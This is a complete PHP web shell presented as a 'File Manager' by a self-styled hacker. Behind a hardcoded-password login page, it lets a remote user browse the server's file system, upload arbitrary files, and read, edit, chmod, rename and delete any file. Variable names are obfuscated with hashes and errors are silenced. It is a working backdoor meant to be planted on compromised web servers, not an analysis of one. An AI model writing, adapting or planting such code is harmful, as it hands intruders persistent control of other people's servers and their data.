 <?php
@session_start();
@set_time_limit(0);
set_time_limit(0);
error_reporting(0);


@$var_25b7f5b6295ca91059b62fc66c6f7cfe = $_POST['pass'];
$var_f4b9787452cec369c44acf1bd53ea064 = true;
$var_fc19c10fea721f916c11170d657c04de = "kareem";
$var_f0e588775aa9084abed9d2e9ef53e240 = "132465";


if($var_25b7f5b6295ca91059b62fc66c6f7cfe == $var_f0e588775aa9084abed9d2e9ef53e240)
{
 $_SESSION['nst'] = "$var_25b7f5b6295ca91059b62fc66c6f7cfe";
}

if($var_f4b9787452cec369c44acf1bd53ea064 == true)
{
 if(!isset($_SESSION['nst']) or $_SESSION['nst'] != $var_f0e588775aa9084abed9d2e9ef53e240)
 {
 die("
  <title>W3Lcome</title>
  <center>
  <table border=0 cellpadding=0 cellspacing=0 width=100% height=100%>
  <tr><td valign=middle align=center>
  <table width=100 bgcolor=black border=6 bordercolor=green><tr><td>
  <font size=1 face=verdana><center>
  <b></font></a><br></b>
  </center>
  <form method=post>
  <font size=1 face=verdana color=blue><strong><center>-W3lcOme 

-</center></strong><br>
  <input type=password name=pass size=30>
  </form>
  <b>Your ip :D:</b> ".$_SERVER["REMOTE_ADDR"]."
  </td></tr></table>
  </td></tr></table>
  ");
 }
}


if(get_magic_quotes_gpc()){
    foreach($_POST as $var_180a3037e57f4f940140793ef5332cbf=>$var_13119a9b18a4585df16792e54e566ff7){
        $_POST[$var_180a3037e57f4f940140793ef5332cbf] = stripslashes($var_13119a9b18a4585df16792e54e566ff7);
    }
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<title>HaTRk File Manager</title>
<style>
body{
    font-family: "Racing Sans One", cursive;
    background-color: #e6e6e6;
    text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
    background-color: #636263;
    text-shadow:0px 0px 10px #fff;
}
#content .first{
    background-color: silver;
}
#content .first:hover{
    background-color: silver;
    text-shadow:0px 0px 1px #757575;
}
table{
    border: 1px #000000 dotted;
}
H1{
    font-family: "Rye", cursive;
}
a{
    color: #000;
    text-decoration: none;
}
a:hover{
    color: #fff;
    text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}
</style>
</HEAD>
<BODY>
<H1><center>novlear HaCkEr File Manager</center></H1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Current Path : ';
if(isset($_GET['path'])){
    $var_1caf042cdd378af3e1aa1393a069e428 = $_GET['path'];   
}else{
    $var_1caf042cdd378af3e1aa1393a069e428 = getcwd();
}
$var_1caf042cdd378af3e1aa1393a069e428 = str_replace('\\','/',$var_1caf042cdd378af3e1aa1393a069e428);
$var_dbb5a3d7da5908ae633199bfdfdde0e0 = explode('/',$var_1caf042cdd378af3e1aa1393a069e428);

foreach($var_dbb5a3d7da5908ae633199bfdfdde0e0 as $var_7b615fec0e17836d1103e9f6224592cb=>$var_ba797bf8fae5cb47a0d3a38d8c30cde3){
    if($var_ba797bf8fae5cb47a0d3a38d8c30cde3 == '' && $var_7b615fec0e17836d1103e9f6224592cb == 0){
        $var_2904f8b9bc3357c67e9ab2f5ee7187f4 = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if($var_ba797bf8fae5cb47a0d3a38d8c30cde3 == '') continue;
    echo '<a href="?path=';
    for($var_6c346649717c696ada8607ddfd976dc2=0;$var_6c346649717c696ada8607ddfd976dc2<=$var_7b615fec0e17836d1103e9f6224592cb;$var_6c346649717c696ada8607ddfd976dc2++){
        echo "$var_dbb5a3d7da5908ae633199bfdfdde0e0[$var_6c346649717c696ada8607ddfd976dc2]";
        if($var_6c346649717c696ada8607ddfd976dc2 != $var_7b615fec0e17836d1103e9f6224592cb) echo "/";
    }
    echo '">'.$var_ba797bf8fae5cb47a0d3a38d8c30cde3.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$var_1caf042cdd378af3e1aa1393a069e428.'/'.$_FILES['file']['name'])){
        echo '<font color="green">File Upload Done.</font><br />';
    }else{
        echo '<font color="red">File Upload Error.</font><br />';
    }
}
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
    echo "<tr><td>Current File : ";
    echo $_GET['filesrc'];
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="green">Change Permission Done.</font><br />';
            }else{
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$var_1caf042cdd378af3e1aa1393a069e428.'/'.$_POST['newname'])){
                echo '<font color="green">Change Name Done.</font><br />';
            }else{
                echo '<font color="red">Change Name Error.</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $var_cc4ee5ae222171352fa0817ad97c21c1 = fopen($_POST['path'],'w');
            if(fwrite($var_cc4ee5ae222171352fa0817ad97c21c1,$_POST['src'])){
                echo '<font color="green">Edit File Done.</font><br />';
            }else{
                echo '<font color="red">Edit File Error.</font><br />';
            }
            fclose($var_cc4ee5ae222171352fa0817ad97c21c1);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
        if($_POST['type'] == 'dir'){
            if(rmdir($_POST['path'])){
                echo '<font color="green">Delete Dir Done.</font><br />';
            }else{
                echo '<font color="red">Delete Dir Error.</font><br />';
            }
        }elseif($_POST['type'] == 'file'){
            if(unlink($_POST['path'])){
                echo '<font color="green">Delete File Done.</font><br />';
            }else{
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $var_b81933f8ab8301728380e8d87ceb7373 = scandir($var_1caf042cdd378af3e1aa1393a069e428);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>Name</center></td>
        <td><center>Size</center></td>
        <td><center>Permissions</center></td>
        <td><center>Options</center></td>
    </tr>';

    foreach($var_b81933f8ab8301728380e8d87ceb7373 as $var_43844558e0c197896e631262da2fe7a5){
        if(!is_dir("$var_1caf042cdd378af3e1aa1393a069e428/$var_43844558e0c197896e631262da2fe7a5") || $var_43844558e0c197896e631262da2fe7a5 == '.' || $var_43844558e0c197896e631262da2fe7a5 == '..') continue;
        echo "<tr>
        <td><a href=\"?path=$var_1caf042cdd378af3e1aa1393a069e428/$var_43844558e0c197896e631262da2fe7a5\">$var_43844558e0c197896e631262da2fe7a5</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable("$var_1caf042cdd378af3e1aa1393a069e428/$var_43844558e0c197896e631262da2fe7a5")) echo '<font color="green">';
        elseif(!is_readable("$var_1caf042cdd378af3e1aa1393a069e428/$var_43844558e0c197896e631262da2fe7a5")) echo '<font color="red">';
        echo fn_de72a0f4f5c9a6bcaa58ec292866c3e0("$var_1caf042cdd378af3e1aa1393a069e428/$var_43844558e0c197896e631262da2fe7a5");
        if(is_writable("$var_1caf042cdd378af3e1aa1393a069e428/$var_43844558e0c197896e631262da2fe7a5") || !is_readable("$var_1caf042cdd378af3e1aa1393a069e428/$var_43844558e0c197896e631262da2fe7a5")) echo '</font>';
        
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$var_1caf042cdd378af3e1aa1393a069e428\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$var_43844558e0c197896e631262da2fe7a5\">
        <input type=\"hidden\" name=\"path\" value=\"$var_1caf042cdd378af3e1aa1393a069e428/$var_43844558e0c197896e631262da2fe7a5\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($var_b81933f8ab8301728380e8d87ceb7373 as $var_7627930d2ca3d69d67459718ffea775a){
        if(!is_file("$var_1caf042cdd378af3e1aa1393a069e428/$var_7627930d2ca3d69d67459718ffea775a")) continue;
        $var_ee4adca0837dae5ff60b16854b329a5f = filesize("$var_1caf042cdd378af3e1aa1393a069e428/$var_7627930d2ca3d69d67459718ffea775a")/1024;
        $var_ee4adca0837dae5ff60b16854b329a5f = round($var_ee4adca0837dae5ff60b16854b329a5f,3);
        if($var_ee4adca0837dae5ff60b16854b329a5f >= 1024){
            $var_ee4adca0837dae5ff60b16854b329a5f = round($var_ee4adca0837dae5ff60b16854b329a5f/1024,2).' MB';
        }else{
            $var_ee4adca0837dae5ff60b16854b329a5f = $var_ee4adca0837dae5ff60b16854b329a5f.' KB';
        }

        echo "<tr>
        <td><a href=\"?filesrc=$var_1caf042cdd378af3e1aa1393a069e428/$var_7627930d2ca3d69d67459718ffea775a&path=$var_1caf042cdd378af3e1aa1393a069e428\">$var_7627930d2ca3d69d67459718ffea775a</a></td>
        <td><center>".$var_ee4adca0837dae5ff60b16854b329a5f."</center></td>
        <td><center>";
        if(is_writable("$var_1caf042cdd378af3e1aa1393a069e428/$var_7627930d2ca3d69d67459718ffea775a")) echo '<font color="green">';
        elseif(!is_readable("$var_1caf042cdd378af3e1aa1393a069e428/$var_7627930d2ca3d69d67459718ffea775a")) echo '<font color="red">';
        echo fn_de72a0f4f5c9a6bcaa58ec292866c3e0("$var_1caf042cdd378af3e1aa1393a069e428/$var_7627930d2ca3d69d67459718ffea775a");
        if(is_writable("$var_1caf042cdd378af3e1aa1393a069e428/$var_7627930d2ca3d69d67459718ffea775a") || !is_readable("$var_1caf042cdd378af3e1aa1393a069e428/$var_7627930d2ca3d69d67459718ffea775a")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$var_1caf042cdd378af3e1aa1393a069e428\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$var_7627930d2ca3d69d67459718ffea775a\">
        <input type=\"hidden\" name=\"path\" value=\"$var_1caf042cdd378af3e1aa1393a069e428/$var_7627930d2ca3d69d67459718ffea775a\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}
echo '<br />novlear File Manager Version <font color="red">1.0</font>, Coded By <font color="red">novlear HaCkEr</font><br />Email: <font color="kremhack@gmail.com</font>
</BODY>
</HTML>';
function fn_de72a0f4f5c9a6bcaa58ec292866c3e0($var_7627930d2ca3d69d67459718ffea775a){
    $var_f4bea9fa472b011bd0384f029125e020 = fileperms($var_7627930d2ca3d69d67459718ffea775a);

if (($var_f4bea9fa472b011bd0384f029125e020 & 0xC000) == 0xC000) {
        $var_94cdc968df89f8090280b5e4ae02a4ac = 's';
} elseif (($var_f4bea9fa472b011bd0384f029125e020 & 0xA000) == 0xA000) {
        $var_94cdc968df89f8090280b5e4ae02a4ac = 'l';
} elseif (($var_f4bea9fa472b011bd0384f029125e020 & 0x8000) == 0x8000) {
        $var_94cdc968df89f8090280b5e4ae02a4ac = '-';
} elseif (($var_f4bea9fa472b011bd0384f029125e020 & 0x6000) == 0x6000) {
        $var_94cdc968df89f8090280b5e4ae02a4ac = 'b';
} elseif (($var_f4bea9fa472b011bd0384f029125e020 & 0x4000) == 0x4000) {
        $var_94cdc968df89f8090280b5e4ae02a4ac = 'd';
} elseif (($var_f4bea9fa472b011bd0384f029125e020 & 0x2000) == 0x2000) {
        $var_94cdc968df89f8090280b5e4ae02a4ac = 'c';
} elseif (($var_f4bea9fa472b011bd0384f029125e020 & 0x1000) == 0x1000) {
        $var_94cdc968df89f8090280b5e4ae02a4ac = 'p';
} else {
        $var_94cdc968df89f8090280b5e4ae02a4ac = 'u';
}

$var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0100) ? 'r' : '-');
$var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0080) ? 'w' : '-');
$var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0040) ?
            (($var_f4bea9fa472b011bd0384f029125e020 & 0x0800) ? 's' : 'x' ) :
            (($var_f4bea9fa472b011bd0384f029125e020 & 0x0800) ? 'S' : '-'));

$var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0020) ? 'r' : '-');
$var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0010) ? 'w' : '-');
$var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0008) ?
            (($var_f4bea9fa472b011bd0384f029125e020 & 0x0400) ? 's' : 'x' ) :
            (($var_f4bea9fa472b011bd0384f029125e020 & 0x0400) ? 'S' : '-'));

$var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0004) ? 'r' : '-');
$var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0002) ? 'w' : '-');
$var_94cdc968df89f8090280b5e4ae02a4ac .= (($var_f4bea9fa472b011bd0384f029125e020 & 0x0001) ?
            (($var_f4bea9fa472b011bd0384f029125e020 & 0x0200) ? 't' : 'x' ) :
            (($var_f4bea9fa472b011bd0384f029125e020 & 0x0200) ? 'T' : '-'));

    return $var_94cdc968df89f8090280b5e4ae02a4ac;
}
?>